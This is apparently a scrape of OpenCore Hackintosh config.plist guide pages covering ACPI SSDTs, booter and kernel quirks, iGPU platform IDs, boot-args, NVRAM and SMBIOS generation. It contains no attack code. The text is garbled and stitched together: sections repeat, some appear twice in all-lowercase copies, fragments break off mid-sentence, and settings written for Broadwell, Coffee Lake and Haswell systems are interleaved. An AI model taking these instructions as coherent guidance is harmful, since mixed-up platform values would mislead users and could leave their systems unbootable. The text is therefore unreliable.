Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi.

The typical breakdown is as follows:\n\nSMBIOS           CPU TYPE                  GPU TYPE                               DISPLAY SIZE\nMacBook8,1       Dual Core 7W(Low End)     iGPU: HD 5300                          12\"\nMacBookAir7,1    Dual Core 15W             iGPU: HD 6000                          11\"\nMacBookAir7,2    Dual Core 15W             iGPU: HD 6000                          13\"\nMacBookPro12,1   Dual Core 28W(High End)   iGPU: Iris 6100                        13\"\nMacBookPro11,2   Quad Core 45W             iGPU: Iris Pro 5200                    15\"\nMacBookPro11,3   Quad Core 45W             iGPU: Iris Pro 5200 + dGPU: GT 750M    15\"\nMacBookPro11,4   Quad Core 45W             iGPU: Iris Pro 5200                    15\"\nMacBookPro11,5   Quad Core 45W             iGPU: Iris Pro 5200 + dGPU: R9 M370X   15\"\niMac16,1         NUC Systems               HD 6000/Iris Pro 6200                  N/A\n\nNote: MacBook8,1 was dropped in macOS Monterey. If running macOS Monterey, select another model.\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               MacBookPro12,1 SMBIOS Info            #\n#######################################################\n\nType:         MacBookPro12,1\nSerial:       C02M9SYJFY10\nBoard Serial: C02408101J9G2Y7A8\nSmUUID:       7B227BEC-660D-405F-8E60-411B3E4EF055\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up correctly. do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# acpi\n\n\n\n\n# add\n\ninfo\n\nthis is where you'll add ssdts for your system, these are very important to booting macos and have many uses like usb maps, disabling unsupported gpus and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nfor us we'll need a couple of ssdts to bring back functionality that clover provided:\n\nrequired ssdts   description\nssdt-plug

and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\ninfo\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, we'll need the following:\n\n * osi rename\n   * this

guide and is used for setting important igpu properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type     comment\n06002616              laptop   recommended value for broadwell laptops\n02001616              nuc      recommended value for broadwell nucs\n\n#

verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n

Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly.

And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\nSSDT-AWAC        This is the 300 series RTC patch, required for most B360,\n                 B365, H310, H370, Z390 and some Z370 boards which prevent\n                 systems from booting macOS. The alternative is SSDT-RTC0 for\n                 when AWAC SSDT is incompatible due to missing the Legacy RTC\n                 clock, to check whether you need it and which to use please\n                 see Getting started with ACPI page.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore.

This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section\n * ProtectMemoryRegions: YES\n   * Patches memory region types for incorrectly mapped CSM/MMIO regions.

Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n0900A53E              Laptop   Recommended value for UHD 630\n00009B3E              Laptop   Recommended value for UHD 620\n07009B3E              NUC      Recommended value for UHD 620/630\n0000A53E              NUC      Recommended value for UHD 655\n\n# Configuration Notes\n\n * For UHD 630 you likely do not need to fake the device-id as it is already 0x3E9B. If it's anything else, you may use device-id=9B3E0000:\n   * You can check under Device Manager in Windows by bring up the iGPU, opening properties, selecting details, and clicking Hardware IDs.\n\nKEY         TYPE   VALUE\ndevice-id   Data   9B3E0000\n\n * A UHD 620 in a Coffee Lake CPU requires device-id=9B3E0000:\n\nKEY         TYPE   VALUE\ndevice-id   Data   9B3E0000\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 64MB higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case these values are added to your iGPU Properties\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout.

setting important igpu properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type

info\n\n * allowsetdefault: yes\n   \n   * allow ctrl+enter and ctrl+index to set default boot device in the picker\n\n * apecid: 0\n   \n   * used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information,

instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args

            macos where their dgpu isn't supported\n-igfxnotelemetryload   prevents igpu telemetry from loading. igpu telemetry may\n                       cause a freeze during startup on certain laptops such as\n                       chromebooks on macos 10.15 and higher, see here for more\n                       information.\n\n * csr-active-config: 00000000\n   \n   * settings for 'system

protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is

we'll chose the macbookpro15,1 smbios - this is done intentionally for compatibility's sake. the breakdown is as follows:\n\nsmbios           cpu type        gpu type

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly.

Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT, this is not needed if you're using SSDT-GPIO\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be pass-through to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n0500260A              Laptop   To be used usually with HD 5000, HD 5100 and HD 5200\n0600260A              Laptop   To be used usually with HD 4200, HD 4400 and HD 4600, you\n                               must use a device-id(see below)\n0300220D              NUC      To be used usually with all Haswell NUCs, HD 4200/4400/4600\n                               must use a device-id(see below)\n\n# Configuration Notes\n\nIn addition to the AAPL,ig-platform-id, you'll want to add the cursor byte size patch from 6MB (00006000) to 9MB because of some glitches:\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-cursormem      Data   00009000\n\nSpecial note for HD 4200, HD 4400 and HD 4600:\n\nYou will also require a device-id spoof to be supported:\n\nKEY         TYPE   VALUE\ndevice-id   Data   12040000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Not relevant for us.\n\n\n# Patch\n\nPatches both the kernel and kexts.\n\n\n# Quirks\n\nInfo\n\nSettings relating to the kernel, for us we'll be enabling the following:\n\nQUIRK                     ENABLED   COMMENT\nAppleCpuPmCfgLock         NO        Need if running 10.10 or older and cannot disable CFG-Lock\n                                    in the BIOS\nAppleXcpmCfgLock          YES       Not needed if CFG-Lock is disabled in the BIOS\nDisableIoMapper           YES       Not needed if VT-D is disabled in the BIOS\nLapicKernelPanic          NO        HP Machines will require this quirk\nPanicNoKextDump           YES       \nPowerTimeoutKernelPanic   YES       \nXhciPortLimit             YES       Disable if running macOS 11.3+\n\nMore in-depth Info\n * AppleCpuPmCfgLock: NO\n   * Only needed when CFG-Lock can't be disabled in BIOS\n   * Only applicable for Ivy Bridge and older\n     * Note: Broadwell and older require this when running 10.10 or older\n * AppleXcpmCfgLock: YES\n   * Only needed when CFG-Lock can't be disabled in BIOS\n   * Only applicable for Haswell and newer\n     * Note: Ivy Bridge-E is also included as it's XCPM capable\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

